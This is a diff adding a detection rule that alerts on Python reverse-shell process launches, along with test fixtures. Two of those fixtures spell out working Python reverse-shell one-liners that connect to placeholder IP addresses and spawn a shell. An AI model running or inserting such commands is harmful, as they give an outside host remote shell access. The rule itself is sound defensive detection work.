@@ -1,0 +1,21 @@
+name: sigma_python_reverse_shell
+mode: alert
+eval: |
+  (
+    e.process_executable.contains("python") && (e.process_args.contains(" -c ") && e.process_args.contains("import") && e.process_args.contains("pty") && e.process_args.contains("socket") && e.process_args.contains("spawn") && e.process_args.contains(".connect"))
+  )
+tests:
+  - cleartext: "python socket pty spawn reverse shell"
+    process_name: python
+    process_executable: /usr/bin/python
+    process_args: "python -c 'import socket,pty;s=socket.socket();s.connect((\"10.10.10.10\",4444));pty.spawn(\"/bin/bash\")'"
+    should_match: true
+  - cleartext: "python3 reverse shell"
+    process_name: python3
+    process_executable: /usr/bin/python3
+    process_args: "python3 -c 'import socket,pty;s=socket.socket();s.connect((\"1.2.3.4\",9999));pty.spawn(\"sh\")'"
+    should_match: true
+  - cleartext: "normal python"
+    process_name: python
+    process_args: "python script.py"
+    should_match: false
